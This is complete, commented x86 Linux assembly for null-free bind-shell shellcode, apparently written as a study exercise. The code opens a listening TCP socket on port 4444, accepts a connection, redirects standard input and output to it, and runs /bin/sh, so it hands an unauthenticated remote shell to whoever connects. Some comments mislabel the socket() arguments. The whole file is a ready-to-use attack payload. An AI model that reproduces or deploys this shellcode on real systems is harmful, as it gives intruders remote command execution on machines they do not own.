global _start
;; Note: We will store 2 file descriptors along the way
;; We will put the listening socket file descriptor in edi
;; We will put the connection socket file descriptor in esi

section .text
  _start:
    ;; Create a socket
    ;; int socketcall(int call, unsigned long *args);
    ;; int socket(int domain, int type, int protocol);
    ;; #define SYS_SOCKET	1		/* sys_socket(2)		*/
    ;; Use socketcall to call down to socket
    xor eax, eax
    mov al, 0x66 ; socketcall syscall
    xor ebx, ebx
    mov bl, 0x1 ; sys_socket syscall number

    ;; Put the socket() args on the stack
    xor ecx, ecx
    push ecx ; INADDR_ANY Accept on any interface 0x00000000
    push ebx ; SOCK_STREAM is the type of socket 1
    push 0x2 ; Protocol AF_INET is the IP Protocol 2

    mov ecx, esp ; Save pointer to args for the socket() call
    int 0x80 ; call sys_socket

    ; Save the returned listening socket file descriptor
    xor edi, edi
    mov edi, eax

    ;; Bind the socket
    ;; Use socketcall to call down to socket
    xor eax, eax
    mov al, 0x66 ; socketcall syscall
    xor ebx, ebx
    mov bl, 0x2 ; sys_bind syscall number

    ;; Start building the sockaddr_in structure
    ;; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ; sin_addr=0 (INADDR_ANY)
    ; INADDR_ANY Accept on any interface 0x00000000
    xor ecx, ecx
    push ecx

    ;; 4444 is 0x115c in little endian. Network byte order is
    ;; Big endian so we swap the byte ordering
    push word 0x5c11 ; sin_port=4444 (network byte order)
    push word bx     ; sin_family=AF_INET (0x2)
    mov ecx, esp     ; move pointer to sockaddr_in structure

    ;; In the initial code we use sizeof to derive the addrlen
    ;; If we print the results of that we get 0x10 which is 16 bytes
    push 0x10 ;addrlen=16
    push ecx  ;struct sockaddr pointer
    push edi  ;sockfd
    mov ecx, esp ;save pointer to bind() args
    int 0x80 ; call sys_bind

    ;; Call listen and prepare for accepting connections
    xor eax, eax
    mov al, 0x66 ; socketcall syscall
    xor ebx, ebx
    mov bl, 0x4 ; sys_listen syscall number

    ;; Place listen's arguments on the stack
    xor ecx, ecx
    push ecx ; backlog we set to zero
    push edi ; push the socket file descriptor
    mov ecx, esp ; place a pointer to the args in ecx
    int 0x80 ; call sys_listen

    ;; Call accept
    xor eax, eax
    mov al, 0x66 ; socketcall syscall
    xor ebx, ebx
    mov bl, 0x5 ; sys_accept syscall number
    ;; Place accept's arguments on the stack
    ;; We don't need a peer socket???... so we
    ;; use nulls for addrlen and sockaddr struct
    xor ecx, ecx
    push ecx ; Push NULL (0x00000000) for addrlen
    push ecx ; Push NULL (0x00000000) for sockaddr struct
    push edi ; Push the listening sockets file descriptor
    mov ecx, esp ; place a pointer to the args in ecx
    int 0x80 ; call sys_accept

    ;; Save the returned connection socket file descriptor
    xor ebx, ebx
    mov ebx, eax

    ;; Call dup2 for stdin, stdout, and stderr in a loop
    xor ecx, ecx
    mov cl, 0x2 ;loop counter
  dup2:
    mov al, 0x3f ;dup2
    int 0x80
    dec ecx
    jns dup2

    ;; Call execve
    xor eax, eax
    mov al, 0xb ;execve
    xor ebx, ebx
    push ebx
    push 0x68732f2f ;"sh//"
    push 0x6e69622f ;"nib/"
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
